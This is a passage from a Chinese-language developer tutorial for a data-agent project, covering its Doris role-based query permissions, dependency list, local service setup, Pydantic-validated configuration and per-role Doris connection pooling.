        self,
        request: ModelRequest[Any],
        handler: Callable[[ModelRequest[Any]], Awaitable[ModelResponse[Any]]],
    ) -> ModelResponse[Any]:
        """在异步模型调用前展开当前回合的语义召回引用。"""
        references = _current_turn_references(request.messages)
        if not references:
            return await handler(request)
```

**为什么绕这一圈**：召回快照可能很大，如果存进 Checkpoint 会撑爆持久化状态；用引用 + 请求期展开，持久化的只是一个小 JSON，展开只发生在真正要发给模型的那一刻。

## 2.5 核心概念 C：查询身份与资产授权

第三个概念：**谁有权查哪些表**。

### 2.5.1 三层权限

```
第 1 层：应用角色
  users.is_admin 一个布尔位。admin 能进管理中心，user 只能对话。

第 2 层：Doris 角色（doris_query_identities 表）
  每个角色绑定一个稳定的共享查询用户 + Fernet 加密的密码 + 资源工作组。
  users.doris_role_name → doris_query_identities.role_name

第 3 层：表/列级 SELECT 权限 + 行级策略
  ├─ 授权投影：doris_role_asset_grants 表（应用侧读权限用）
  └─ 真实权限：Doris 侧 GRANT SELECT_PRIV(col,…) ON … TO ROLE …
               行策略实时读 Doris（不落 PG）
```

### 2.5.2 为什么要投影一份到 PostgreSQL

因为**语义召回不经过 Doris**。Explorer 先查元数据目录（PG）和语义索引（ES）来确定该查哪些表，这一步如果不知道用户权限，就会把无权表的信息泄漏给模型。所以必须有一份应用侧可读的授权投影，在召回阶段就做前置过滤。

代价是双写：改权限时要同时改 Doris 和 PG，两者不在一个事务里（Doris 不参与 PG 事务），因此全链路用「快照 + 补偿」的 Saga 模式。代码里的注释写得很直白：

```python
        except BaseException:
            # Doris 不参与 PostgreSQL 事务；包括提交失败和任务取消在内的任一中断都
            # 必须按已完成步骤恢复，避免真实权限与 PostgreSQL 投影长期分离。
            if snapshot is not None and drop_state is not None:
                await self._compensate_role_deletion(snapshot, drop_state)
            raise
```

### 2.5.3 authorization_epoch 解决什么问题

角色表上有一个 `authorization_epoch: UUID` 字段。每次权限变更（授/收 SELECT、改行策略）都会轮换它：

```python
    def rotate_authorization_epoch(self) -> None:
        """推进角色授权代次，使旧查询经验立即失效。"""
        self.authorization_epoch = uuid4()
```

它同时解决两个问题：

1. **查询经验失效**。旧经验是在旧权限下验证过的 SQL，权限变了可能引用到无权字段，必须立刻失效。
2. **连接池失效**。`DorisQueryClientRegistry` 按角色缓存连接池，权限变了要重建。

### 2.5.4 查询执行时的三道闸

一次 `execute_sql` 从工具到 Doris，中间过三道：

```
execute_sql 工具
   │
   ├─ 闸 1：身份解析（query_principal）
   │    用户 → Doris 角色 → 查询用户名 + 解密密码 + 资源工作组
   │    没有角色 → QueryPrincipalNotConfiguredError，直接拒绝
   │
   ├─ 闸 2：SQL 静态校验（QueryGuardService.check）
   │    只读检查 → 目录加载 → 字段存在性 → JOIN 条件 → 资产权限
   │    纯 sqlglot AST 分析，不连数据库
   │
   └─ 闸 3：执行期资源限制
        SET workload_group / query_timeout / exec_mem_limit
        只读权限自检（查询账号必须只有 SELECT_PRIV / READ_ONLY）
```

三道闸的细节在第 7 章展开。

---

# 3. 项目开发环境

## 3.1 创建项目与包管理

项目用 **uv** 管理依赖（`uv.lock` 有 51 万字节，锁得很死），Python 要求 `>=3.12`。

`pyproject.toml` 全文：

```toml
[project]
dependencies = [
  "asyncmy>=0.2.11",
  "celery[redis]>=5.6.3,<6",
  "cryptography>=46.0.4",
  "deepagents[quickjs]>=0.7.1,<0.8",
  "docker>=7.1,<8",
  "elasticsearch[async]>=8.19,<9",
  "fastapi>=0.135.1",
  "httpx>=0.28.1",
  "langchain>=1.2.7",
  "langchain-mcp-adapters>=0.2.1",
  "langchain-openai>=1.1.7",
  "langchain-openrouter>=0.2.8,<0.3",
  "langgraph>=1.0.7",
  "langgraph-checkpoint-postgres>=3.1.2",
  "loguru>=0.7.3",
  "omegaconf>=2.3.0",
  "pwdlib[argon2]>=0.3.0",
  "pyjwt>=2.10.1",
  "psycopg[binary,pool]>=3.3.4",
  "python-dotenv>=1.2.2",
  "python-multipart>=0.0.32",
  "pyyaml>=6.0.3",
  "sqlalchemy>=2.0.46",
  "sqlglot>=27.0.0",
  "uvicorn[standard]>=0.52.0",
]
description = "Intelligent data querying and analysis"
name = "data-agent"
requires-python = ">=3.12"
version = "0.1.0"

[dependency-groups]
dev = [
  "pyright>=1.1.410",
  "pytest>=9.1.1",
  "ruff>=0.15.16",
]

[tool.pytest.ini_options]
testpaths = ["tests"]

[tool.pyright]
venv = ".venv"
venvPath = "."
reportDeprecated = "warning"
include = ["app", "main.py", "scripts", "tests"]
exclude = [
  "**/.*",
  "**/__pycache__",
  "**/node_modules",
  ".venv",
  "dbmock",
  "web",
]
```

初始化步骤：

```bash
uv sync
```

> 注意 `[tool.pytest.ini_options]` 声明了 `testpaths = ["tests"]`，但**仓库里没有 `tests/` 目录**。这个配置是从模板带过来的，实际项目没有单元测试——验证靠跑通链路。这一点在每一章的「测试」小节都会再提一次。

## 3.2 安装项目依赖

逐个说明为什么需要（按 pyproject 里的顺序，分组看）：

**Web 与协议层**

| 依赖 | 为什么需要 |
| --- | --- |
| `fastapi` | 后端框架。路由、依赖注入、`lifespan`、SSE 都靠它。 |
| `uvicorn[standard]` | ASGI 服务器。`[standard]` 带上 `httptools` 和 `websockets`，性能与兼容性更好。 |
| `python-multipart` | 附件上传接口需要解析 `multipart/form-data`。 |
| `httpx` | 异步 HTTP 客户端，用于调用 OpenAI 兼容的 Embedding 服务。 |
| `pyjwt` | 签发和校验 access / refresh token。 |
| `pwdlib[argon2]` | 密码哈希，用 Argon2id。 |

**数据库**

| 依赖 | 为什么需要 |
| --- | --- |
| `sqlalchemy` | ORM 与连接池。三个 PG 库共用一个管理器实现。 |
| `psycopg[binary,pool]` | PG 驱动。`[binary]` 免编译，`[pool]` 提供 `AsyncConnectionPool`——LangGraph Checkpointer 直接用它。 |
| `asyncmy` | Doris 驱动。Doris 兼容 MySQL 协议，SQLAlchemy 的 `mysql+asyncmy` 方言走这里。 |
| `sqlglot` | SQL 解析器。**这是本项目安全模型的地基**：只读校验、字段存在性校验、JOIN 校验、行策略谓词校验全靠它做 AST 分析。 |

**Agent 与模型**

| 依赖 | 为什么需要 |
| --- | --- |
| `deepagents[quickjs]` | Agent 框架，提供 `create_deep_agent` / `FilesystemMiddleware` / `CompositeBackend`。`[quickjs]` 装上 QuickJS 解释器，Planner 的 `eval` 工具靠它做并行编排。 |
| `langchain` / `langgraph` | Agent 与状态图运行时。`create_agent`、中间件、Checkpoint 都在这里。 |
| `langgraph-checkpoint-postgres` | 把 LangGraph 状态持久化到 PostgreSQL。 |
| `langchain-openai` | 模型客户端基类。DeepSeek 走的是它的 Responses API 适配。 |
| `langchain-openrouter` | OpenRouter 模型接入（配置里默认注释掉）。 |
| `langchain-mcp-adapters` | 把 MCP server 暴露的工具转成 LangChain Tool。 |

**中间件与任务**

| 依赖 | 为什么需要 |
| --- | --- |
| `elasticsearch[async]` | 语义索引的读写，必须用异步客户端。 |
| `celery[redis]` | 后台任务与定时调度。`[redis]` 装上 broker/backend 驱动。 |
| `docker` | 通过 Docker SDK 管理用户沙箱容器与数据卷。 |
| `cryptography` | Fernet 对称加密，用于加密 Doris 查询身份密码。 |

**配置与可观测**

| 依赖 | 为什么需要 |
| --- | --- |
| `omegaconf` | 读 YAML 并做 `${oc.env:XXX}` 环境变量插值。 |
| `python-dotenv` | 把 `conf/.env` 加载进环境变量。 |
| `pyyaml` | 元数据 YAML 导入导出。 |
| `loguru` | 结构化日志，支持多 sink（控制台 + JSONL 文件）。 |

## 3.3 搭建开发环境

dev 依赖只有三个：

```bash
uv run ruff check .        # Lint
uv run ruff format .       # 格式化
uv run pyright             # 类型检查
```

`pyright` 配置里 `venv = ".venv"` + `venvPath = "."`，直接指向 uv 建的虚拟环境，不需要额外配置。

前端用 **Biome** 而不是 ESLint + Prettier：

```bash
npm --prefix web run lint
npm --prefix web run format
npm --prefix web run test        # vitest
```

## 3.4 安装所需服务

前面 1.2 已经讲过怎么起服务，这里补每个中间件「是什么、为什么选它、怎么验证」。

### 3.4.1 PostgreSQL（3 个库）

**为什么选它**：项目里有 7 类需要事务一致性的数据——用户/令牌、Doris 角色与授权投影、元数据目录、召回快照、查询执行记录、查询经验、会话目录与删除墓碑——它们之间有关联查询（比如「查这个用户能看的表，再查这些表的字段」）。ES 不适合做这个，Doris 是分析库不适合做 OLTP。

**为什么拆成三个库而不是一个**：边界清晰、可独立重建。

| 库 | 内容 | ORM 基类 | 客户端 |
| --- | --- | --- | --- |
| `auth` | `users` / `refresh_tokens` / `doris_query_identities` / `doris_role_asset_grants` / `user_deletion_tasks` | `AuthBase` | `auth_postgres_client_manager` |
| `meta` | 元数据目录、召回快照、查询执行记录、查询经验 | `MetaBase` | `meta_postgres_client_manager` |
| `langgraph` | 会话目录 `conversations`、删除墓碑、LangGraph Checkpoint 表 | `AssistantBase` | `assistant_postgres_client_manager` |

**验证**：

```bash
docker exec -it postgres psql -U atguigu -d postgres -c "\l"
```

预期能看到 `auth` / `meta` / `langgraph` 三个库。

### 3.4.2 Elasticsearch

**为什么选它**：需要同时做中文全文检索（IK 分词）和向量检索（dense_vector + HNSW），而且要做混合打分。ES 8.x 原生支持 `knn` 查询和 `dense_vector`，一个索引里既能放文本也能放向量。

**为什么本地构建镜像**：官方镜像不含中文分词器。`docker/elasticsearch/Dockerfile` 把 `elasticsearch-analysis-ik-8.19.10.zip` 打进插件目录。

**验证**：

```bash
curl -s http://127.0.0.1:9200/_cat/indices?v
```

首次导入元数据前这里应该是空的；导入并同步后能看到 `data-agent-column` 等 4 个索引。

### 3.4.3 Redis

**为什么选它**：三处用途都不适合放进程内。

| db | 用途 | 为什么必须跨进程 |
| --- | --- | --- |
| 0 / 1 | Celery broker / result backend | API 进程提交任务，Worker 进程消费 |
| 2 | 沙箱所有权锁、租约、活动时间 | 同一用户的容器可能被 API 进程和多个 Worker 同时操作 |
| 3 | 认证限流计数 | 登录限流要跨 API 实例共享 |

配置在 `conf/app_config.yaml` 里体现为四个不同的 URL：

```yaml
task_queue:
  broker_url: redis://127.0.0.1:6379/0
  result_backend: redis://127.0.0.1:6379/1
auth:
  rate_limit_redis_url: redis://127.0.0.1:6379/3
sandbox:
  ownership:
    redis_url: redis://127.0.0.1:6379/2
```

**验证**：

```bash
docker exec -it redis redis-cli ping
```

### 3.4.4 Doris

**为什么选它**：目标是**面向分析的查询**——几亿行明细上做聚合、按时间窗口切片。Doris 的 MPP 架构和向量化执行引擎适合这个场景，而且兼容 MySQL 协议，`asyncmy` 驱动能直接用。

**两个角色要分清**：

- `atguigu`（管理账号）：应用用来读元数据、建角色、授权限。密码来自 `DORIS_ADMIN_PASSWORD`。
- 每个 Doris 角色对应的**查询用户**（由平台自动生成随机密码）：Explorer 执行 SQL 时用这个身份连，权限被限制到授权范围内。

**验证**：

```bash
docker exec -it doris-fe mysql -h127.0.0.1 -P9030 -uatguigu -p123123 -e "SHOW DATABASES;"
```

预期能看到 `ecommerce`（灌数后）。

### 3.4.5 Docker 沙箱镜像

**为什么需要**：Agent 要执行模型生成的 Python / Shell 代码。这些代码不能跑在宿主机上。

镜像里预装的是数据分析栈（`docker/sandbox/requirements.txt`，逐字）：

```
duckdb==1.5.5
matplotlib==3.11.1
numpy==2.5.2
openpyxl==3.1.5
pandas==3.0.5
polars==1.43.2
pyarrow==25.0.1
scikit-learn==1.9.0
scipy==1.18.0
seaborn==0.13.2
```

外加 Node 侧两个包（`docker/sandbox/package.json`）：

```json
{
  "name": "dataagent-sandbox-runtime",
  "private": true,
  "dependencies": {
    "lodash": "4.17.21",
    "papaparse": "5.5.3"
  }
}
```

还装了中文字体 `fonts-wqy-zenhei`，因为 analyst 要用 matplotlib 出中文图表。

**验证镜像本身可用**：

```bash
docker images | grep dataagent-sandbox
```

预期输出一行 `dataagent-sandbox   latest   <id>   ...`。

手动起一个容器验证隔离基线：

```bash
docker run --rm -it --network none --user 1000:1000 -w /data \
  dataagent-sandbox:latest /bin/sh -lc "id; touch /data/probe && ls -l /data/probe"
```

预期：`uid=1000(sandbox) gid=1000(sandbox)`，且 `/data/probe` 创建成功。

验证运行期断网（应该失败）：

```bash
docker run --rm --network none dataagent-sandbox:latest \
  /bin/sh -lc "python -c \"import urllib.request; urllib.request.urlopen('https://pypi.org')\""
```

预期：抛网络不可达异常。**这是刻意的**——所有依赖必须构建期固化，运行期不允许联网下载。

验证中文字体：

```bash
docker run --rm dataagent-sandbox:latest \
  /bin/sh -lc "fc-match 'WenQuanYi Zen Hei'"
```

预期：`wqy-zenhei.ttc: "WenQuanYi Zen Hei" ...`。

---

# 4. 基础设施搭建

这一章讲的全是**与业务无关的通用能力**。顺序按依赖关系排：配置 → 四类客户端 → Checkpoint → 后台任务 → 错误 → 日志 → 应用装配。

每个组件都按同一套节奏写：**先给能跑的最朴素写法 → 说它有什么问题 → 给优化后的写法 → 给常用操作示例**。这个递进比直接贴最终代码有用得多。

## 4.1 项目目录结构

```
Intelligent_digital_attribution/
├── main.py                     后端入口：lifespan / 中间件 / 路由注册 / uvicorn 启动
├── Makefile                    start / run / web / worker / beat / init-db / bootstrap-admin
├── pyproject.toml              Python 依赖与工具配置
├── uv.lock                     依赖锁文件
│
├── conf/
│   ├── app_config.yaml         全部运行参数（唯一配置源）
│   ├── .env                    密钥（不进版本库）
│   ├── .env.example            密钥模板
│   └── meta_config.yaml        元数据导入文档（45 表 / 114 指标）
│
├── app/
│   ├── providers.py            ★ 全局单例装配入口
│   ├── shared/                 基础设施层
│   │   ├── config/app_config.py      OmegaConf + Pydantic 配置模型
│   │   ├── clients/                  Doris / PG×3 / ES / Embedding / Checkpoint
│   │   ├── contracts/                跨模块共享的领域模型（analysis / assets / doris / ...）
│   │   ├── database/base.py          三个 ORM 声明基类
│   │   ├── errors/                   ProblemError + 全局异常处理器
│   │   ├── observability/            context(ContextVar) / log(loguru) / trace(中间件)
│   │   └── tasks/                    celery_app / runner / schemas / submission
│   ├── identity/               认证与授权
│   ├── metadata/               元数据知识库与语义召回
│   ├── query/                  安全查询链路
│   ├── sandbox/                Docker 隔离工作区
│   ├── assistant/              多 Agent 体系
│   └── workflows/              跨存储工作流
│
├── scripts/
│   ├── init_db.py              重建 PostgreSQL 三库
│   └── bootstrap_admin.py      创建/提升管理员
│
├── docker/
│   ├── compose.yml             postgres / elasticsearch / redis / doris / sandbox-image
│   ├── elasticsearch/          含 IK 分词器的 ES 镜像
│   ├── postgres/init-databases.sql
│   └── sandbox/                用户容器镜像（Dockerfile / requirements.txt / package.json）
│
├── dbmock/                     独立子项目：模拟电商数仓生成器
├── web/                        前端
└── logs/                       运行期日志（自动创建）
```

每个业务模块内部结构完全一致，以 `metadata` 为例：

```
app/metadata/
├── __init__.py
├── config.py           导入文档的 Pydantic 模型
├── errors.py           模块内业务异常
├── providers.py        模块内服务装配
├── tasks.py            Celery 任务
├── task_scheduler.py   把索引同步提交到队列
├── task_submission.py  任务名常量与提交协议
├── api/meta/
│   ├── router.py       路由
│   └── schemas.py      请求/响应模型
├── models/
│   ├── catalog.py      表/字段/指标 ORM
│   ├── recall.py       召回快照 ORM
│   └── search.py       索引文档与召回请求/响应模型
├── repositories/
│   ├── postgres.py     MetaPGRepo
│   ├── column_index.py ColumnESRepo
│   ├── metric_index.py MetricESRepo
│   ├── value_index.py  ValueESRepo
│   ├── semantic_index.py  字段/指标共用的 ES 基类
│   ├── recall.py       SemanticRecallPGRepo
│   └── source_doris.py SourceDorisRepo
└── services/
    ├── catalog.py           目录 CRUD
    ├── import_service.py    YAML 批量导入
    ├── index.py             索引同步
    ├── search.py            多路召回
    ├── recall.py            召回快照管理
    ├── authorization_filter.py  权限过滤
    └── contracts.py         对外端口协议
```

**记住这个四层结构**，后面每一章都能按 `api → services → repositories → models` 的顺序读代码。

## 4.2 项目配置管理

### 4.2.1 配置文件

`conf/app_config.yaml` 是唯一的运行参数来源。它的特点是**每行都有中文注释说明用途**，看配置就知道系统有什么能力。挑几个关键段落：

```yaml
port: 7000 # 后端 HTTP 服务监听端口。

cors_origins: [] # 允许跨域访问后端的前端 Origin 列表。

log: # 应用日志输出配置。
  level: INFO # 日志级别 (DEBUG, INFO, WARNING, ERROR, CRITICAL)。
  rotation: 10MB # 日志文件滚动大小。

doris: # Doris 管理连接，用于角色权限管理等平台操作。
  host: 127.0.0.1 # 数据服务主机地址。
  port: 9030 # 数据服务连接端口。
  user: atguigu # 连接账号。
  password: ${oc.env:DORIS_ADMIN_PASSWORD} # 连接密码，使用环境变量注入。
  database: ecommerce # 默认连接数据库。
```

**密钥不写进 YAML**，用 `${oc.env:XXX}` 占位，运行时从 `conf/.env` 注入：

```yaml
doris_credentials: # Doris 查询身份密码的应用侧加密配置。
  encryption_key: ${oc.env:DORIS_CREDENTIAL_ENCRYPTION_KEY} # Fernet 密钥。
```

### 4.2.2 加载工具

**最朴素的写法**是直接读 YAML 用字典：

```python
# 能跑，但不要这样写
import yaml
with open("conf/app_config.yaml") as f:
    cfg = yaml.safe_load(f)
port = cfg["port"]          # 拼错 key 时 KeyError，且到运行时才炸
db_port = cfg["doris"]["prot"]   # 少个字母，跑起来才发现
```

问题有三个：

1. **拼错的字段名不会在启动时被发现**，要等用到那一行代码才报 `KeyError`。
2. **没有类型检查**。`port: "7000"`（字符串）和 `port: 7000`（整数）都能通过，到 `uvicorn.Config` 才出问题。
3. **没有跨字段约束**。比如 `idle_stop_seconds` 必须小于 `idle_remove_seconds`，YAML 本身表达不了。

**优化后的写法**：OmegaConf 读 YAML + 环境变量插值，再用 Pydantic 做一次强校验。`app/shared/config/app_config.py` 的第一步是定义一个「拒绝未知字段」的基类：

```python
class AppConfigModel(BaseModel):
    """拒绝未知字段的应用配置基类。"""

    model_config = ConfigDict(extra="forbid")
```

`extra="forbid"` 是关键——YAML 里写错键名会**在启动时**直接抛校验错误，而不是静默忽略。

然后是配置模型。数据库连接部分：

```python
# 数据连接与检索配置。
class DBConfig(AppConfigModel):
    """数据库连接配置。"""

    host: str = Field(min_length=1)
    port: int = Field(ge=1, le=65535)
    user: str = Field(min_length=1)
    password: SecretStr = Field(min_length=1)
    database: str = Field(min_length=1)
```

注意 `password: SecretStr`——它的作用是不让密码在日志和异常堆栈里明文出现。取值时必须显式调 `.get_secret_value()`，所以「不小心把密码打进日志」这个常见事故在类型层面就被挡住了。

跨字段约束用 `model_validator` 表达。比如后台任务的软硬超时关系：

```python
class TaskQueueConfig(AppConfigModel):
    """Celery 任务队列配置。"""

    broker_url: SecretStr = Field(min_length=1)
    result_backend: SecretStr = Field(min_length=1)
    result_expires_seconds: int = Field(gt=0)
    task_time_limit_seconds: int = Field(gt=0)
    task_soft_time_limit_seconds: int = Field(gt=0)
    worker_prefetch_multiplier: int = Field(gt=0)
    value_index_sync_time: time
    lifecycle_schedule_seconds: int = Field(gt=0)
    query_experience_repair_seconds: int = Field(gt=0)

    @model_validator(mode="after")
    def validate_time_limits(self) -> "TaskQueueConfig":
        """校验后台任务软硬超时关系。"""
        if self.task_soft_time_limit_seconds >= self.task_time_limit_seconds:
            raise ValueError(
                "task_soft_time_limit_seconds 必须小于 task_time_limit_seconds"
            )
        if (
            self.value_index_sync_time.second != 0
            or self.value_index_sync_time.microsecond != 0
            or self.value_index_sync_time.tzinfo is not None
        ):
            raise ValueError("value_index_sync_time 必须是 HH:MM 格式的本地时间")
        return self
```

沙箱配置的校验更复杂——它要保证容量限制之间自洽，还要预渲染数据卷驱动选项模板：

```python
    @model_validator(mode="after")
    def validate_size_limits(self) -> "SandboxConfig":
        """校验沙箱容量限制之间的关系。"""
        if self.max_file_bytes > self.max_user_storage_bytes:
            raise ValueError("max_file_bytes 不能大于 max_user_storage_bytes")
        if self.idle_stop_seconds >= self.idle_remove_seconds:
            raise ValueError("idle_stop_seconds 必须小于 idle_remove_seconds")
        option_fields = {
            "deployment_namespace": self.deployment_namespace,
            "user_id": 1,
            "max_user_storage_bytes": self.max_user_storage_bytes,
        }
        try:
            rendered_options = {
                key: value.format_map(option_fields)
                for key, value in self.volume_driver_options.items()
            }
        except (KeyError, ValueError) as exc:
            placeholder = exc.args[0] if exc.args else "格式无效"
            raise ValueError(f"数据卷驱动选项模板无效: {placeholder}") from exc
        if any(not key or not value for key, value in rendered_options.items()):
            raise ValueError("数据卷驱动选项不能包含空键或空值")
        if self.volume_driver != "local" and not any(
            "{max_user_storage_bytes}" in value
            for value in self.volume_driver_options.values()
        ):
            raise ValueError("数据卷驱动选项必须包含 max_user_storage_bytes 占位符")
        return self
```

模型配置里还有一类**引用完整性校验**——`agent.specialists` 必须覆盖全部 Agent 类型，且引用的模型必须在 `lm_config.models` 里声明过：

```python
    @model_validator(mode="after")
    def validate_agent_models(self) -> "Cfg":
        """要求所有专业 Agent 均显式配置且引用可用模型。"""
        required_specialists = set(AGENT_TYPES)
        configured_specialists = set(self.agent.specialists)
        missing = sorted(required_specialists - configured_specialists)
        if missing:
            raise ValueError("agent.specialists 缺少配置: " + ", ".join(missing))
        for agent_type, specialist in self.agent.specialists.items():
            if specialist.model not in {"default", *self.lm_config.models}:
                raise ValueError(
                    f"agent.specialists.{agent_type}.model 引用了未知模型: "
                    f"{specialist.model}"
                )
        return self
```

模型配置还有一个细节：**禁止 `params` 覆盖显式字段**。这防止了「在 `params` 里偷偷把 `api_key` 换成别的」这类问题：

```python
    @model_validator(mode="after")
    def validate_client_parameters(self) -> "ModelCfg":
        """禁止附加参数覆盖显式模型配置和协议选项。"""
        reserved = {
            "api_key",
            "api_protocol",
            "base_url",
            "max_retries",
            "model",
            "model_name",
            "model_provider",
            "openai_api_base",
            "openai_api_key",
            "output_version",
            "profile",
            "request_timeout",
            "store",
            "streaming",
            "timeout",
            "use_previous_response_id",
            "use_responses_api",
        }
        conflicts = sorted(reserved & self.params.keys())
        if conflicts:
            raise ValueError("params 不能覆盖模型配置字段: " + ", ".join(conflicts))
        if self.api_protocol == "responses" and self.model_provider not in {
            "deepseek",
            "openai",
        }:
            raise ValueError("Responses API 仅支持 model_provider: deepseek 或 openai")
        return self
```

MCP 配置用了**可辨识联合**，按 `transport` 字段自动选对应模型：

```python
MCPCfg = Annotated[
    SSEMCPCfg | StdioMCPCfg | WebsocketMCPCfg | StreamableHttpMCPCfg,
    Field(discriminator="transport"),
]
```

这样 YAML 里 `transport: streamable_http` 就自动按 `StreamableHttpMCPCfg` 校验，不需要手写 if-else 分支。

### 4.2.3 加载配置文件

最后三行代码完成加载，模块导入时就执行：

```python
def _load_config() -> Cfg:
    """从 .env 和 app_config.yaml 加载配置。"""
    dotenv.load_dotenv(CONFIG_DIR / ".env")
    loaded_cfg = OmegaConf.load(CONFIG_FILE)
    primitive_cfg = OmegaConf.to_container(loaded_cfg, resolve=True)
    return Cfg.model_validate(cast(dict[str, Any], primitive_cfg))


cfg = _load_config()
```

`resolve=True` 是让 OmegaConf 把 `${oc.env:XXX}` 插值掉。顺序很重要：**先加载 `.env`**，再让 OmegaConf 读 YAML，否则插值拿不到环境变量。

路径常量用 `Path(__file__).parents[3]` 反推项目根，不依赖当前工作目录：

```python
# 路径常量。
ROOT_DIR = Path(__file__).parents[3]
CONFIG_DIR = ROOT_DIR / "conf"
CONFIG_FILE = CONFIG_DIR / "app_config.yaml"
```

`app/shared/config/__init__.py` 把模块本身导出（`from app.shared.config import app_config`），这样使用方写 `app_config.cfg.xxx` 而不是 `from app.shared.config.app_config import cfg`——好处是配置对象在测试里更容易被替换。

**配置加载失败的表现**：`cfg = _load_config()` 在模块顶层执行，所以配置有错时**任何 import 到 `app_config` 的模块都会导入失败**，应用起不来。这是刻意的——配置错了不该让它跑起来。

## 4.3 Doris 客户端管理

### 4.3.1 基本使用

最朴素的写法是每次查询现连：

```python
# 能跑，但每次查询都要建一次 TCP 连接 + 握手 + 认证
from sqlalchemy.ext.asyncio import create_async_engine

async def query(sql: str):
    engine = create_async_engine("mysql+asyncmy://atguigu:123123@127.0.0.1:9030/ecommerce")
    async with engine.connect() as conn:
        result = await conn.execute(text(sql))
        return result.fetchall()
```

问题：

1. **每次查询几十毫秒的连接开销**。分析查询本身可能只要 100ms，握手占了一半。
2. **连接数不可控**。并发上来会把 Doris 的连接打满。
3. **连接失效不自知**。Doris FE 重启后旧连接全废，下次查询报错。

### 4.3.2 优化配置编码

先把连接信息抽成配置对象，并且区分「管理连接」和「查询连接」——它们的 host/port/database 一样，但 user/password 完全不同。`app/shared/clients/doris_client_manager.py` 用 SQLAlchemy 的 `URL.create` 构造连接串：

```python
class DorisClientManager:
    """Doris 客户端管理器。"""

    def __init__(self, db_config: DBConfig) -> None:
        """初始化 Doris 客户端管理器。"""
        self._db_config = db_config
        self._engine: AsyncEngine | None = None

    @property
    def _url(self) -> URL:
        """获取 Doris 异步连接 URL。"""
        return URL.create(
            drivername="mysql+asyncmy",
            username=self._db_config.user,
            password=self._db_config.password.get_secret_value(),
            host=self._db_config.host,
            port=self._db_config.port,
            database=self._db_config.database,
        )
```

**用 `URL.create` 而不是拼字符串**，因为用户名或密码里有 `@` `:` `/` 这类字符时，手拼字符串会拼出错误的 URL。

### 4.3.3 优化连接池

`init()` 一次性建好连接池，五个参数各有作用：

```python
    def init(self) -> None:
        """初始化 Doris 连接池。"""
        self._engine = create_async_engine(
            self._url,
            echo=False,
            pool_size=10,
            max_overflow=20,
            pool_pre_ping=True,
            pool_recycle=1800,
            pool_timeout=30,
        )
```

| 参数 | 值 | 作用 |
| --- | --- | --- |
| `pool_size` | 10 | 常驻连接数 |
| `max_overflow` | 20 | 峰值时最多临时多开 20 条，总计 30 条 |
| `pool_pre_ping` | True | 取用连接前先 ping 一次，失效连接自动重建。**这是解决 Doris FE 重启后报错的关键** |
| `pool_recycle` | 1800 | 连接活过 30 分钟就回收，避开服务端的空闲超时 |
| `pool_timeout` | 30 | 池满时最多等 30 秒，超时抛错而不是无限挂住 |

`pool_pre_ping` 有代价——每次取连接多一次往返。这里接受这个代价，因为 Doris 查询本身是重操作，多几毫秒换来「不会拿到死连接」很划算。

引擎用延迟初始化 + 显式校验：

```python
    def _get_engine(self) -> AsyncEngine:
        """获取 Doris 数据库引擎。"""
        if self._engine is None:
            raise RuntimeError("Doris 客户端管理器尚未初始化")
        return self._engine

    def connection(self) -> AsyncConnection:
        """创建 Doris 数据库连接。"""
        return self._get_engine().connect()

    async def close(self) -> None:
        """关闭 Doris 连接池并释放资源。"""
        if self._engine is not None:
            await self._engine.dispose()
        self._engine = None
```

**为什么不在 `__init__` 里建引擎**：建引擎本身不连数据库（懒连接），但把「初始化」和「构造对象」分开能让 `init()` 集中在 `lifespan` 里调用，关闭顺序也更好控制。

### 4.3.4 按角色隔离的连接池注册表

这是 Doris 客户端管理里最有设计感的一块。

**问题**：每个用户用自己绑定的 Doris 角色查询。如果全局共用一个连接池，那就只能用一个账号——权限体系就废了。

**朴素做法**：每次查询临时建一个 `DorisClientManager`。

```python
# 能跑，但每次查询都重建连接池
manager = DorisClientManager(query_db_config)
manager.init()
try:
    await do_query(manager)
finally:
    await manager.close()
```

问题：`init()` 会建 10 条常驻连接，查询完又全关掉。同一个用户连续查 5 次，就建关 5 次池，比不用池还慢。

**优化后的做法**：按角色名缓存连接池，并用**凭据指纹**判断缓存是否还有效：

```python
class DorisQueryClientRegistry:
    """按数据库中的稳定查询身份动态管理 Doris 连接池。"""

    def __init__(self, endpoint: DBConfig) -> None:
        """初始化查询端点和按角色隔离的连接池注册表。"""
        self._endpoint = endpoint
        self._entries: dict[str, _QueryClientEntry] = {}
        self._lock = asyncio.Lock()

    async def get_or_create(
        self,
        role_name: str,
        query_user: str,
        password: str,
    ) -> DorisClientManager:
        """读取或创建与当前查询凭据一致的连接池。"""
        fingerprint = hashlib.sha256(f"{query_user}\0{password}".encode()).hexdigest()
        stale: DorisClientManager | None = None
        async with self._lock:
            current = self._entries.get(role_name)
            if current is not None and current.fingerprint == fingerprint:
                return current.manager
            if current is not None:
                stale = current.manager
            manager = DorisClientManager(
                DBConfig(
                    host=self._endpoint.host,
                    port=self._endpoint.port,
                    user=query_user,
                    password=SecretStr(password),
                    database=self._endpoint.database,
                )
            )
            manager.init()
            self._entries[role_name] = _QueryClientEntry(fingerprint, manager)
        if stale is not None:
            await stale.close()
        return manager
```

三个细节值得注意：

1. **指纹而不是明文比较**。`sha256(f"{query_user}\0{password}")`——用 `\0` 分隔避免「user=a, pass=bc」和「user=ab, pass=c」撞出同一个串。用哈希而不是明文，是为了不让密码在内存里多留一份。
2. **旧连接池在锁外关闭**。`await stale.close()` 放在 `async with self._lock` 之外——`close()` 会等待连接归还，持锁做这件事会阻塞其它角色的请求。
3. **旧连接池不立即失效**。正在使用它的查询会跑完，只是后续新查询拿不到它了。

缓存失效有两个入口：

```python
    async def invalidate(self, role_name: str) -> None:
        """关闭并移除指定角色的查询连接池。"""
        async with self._lock:
            entry = self._entries.pop(role_name, None)
        if entry is not None:
            await entry.manager.close()

    async def close(self) -> None:
        """关闭全部查询身份连接池。"""
        async with self._lock:
            entries = tuple(self._entries.values())
            self._entries.clear()
        for entry in entries:
            await entry.manager.close()
```

`invalidate` 由权限变更触发（改权限 → 轮换 `authorization_epoch` → 让这个角色的连接池作废），`close` 由应用关停触发。

模块底部创建两个全局实例——**一个管理连接，一个查询连接注册表**：

```python
admin_doris_client_manager = DorisClientManager(cfg.doris)
query_doris_client_registry = DorisQueryClientRegistry(cfg.doris)
```

管理连接只有一个（平台自己的账号），查询连接池按角色动态增长。

## 4.4 PostgreSQL 客户端管理

### 4.4.1 基本使用

朴素的异步写法：

```python
# 能跑，但每个请求都建引擎，且忘记 dispose 会泄漏
async def get_user(user_id: int):
    engine = create_async_engine(url)
    async with AsyncSession(engine) as session:
        return await session.get(User, user_id)
```

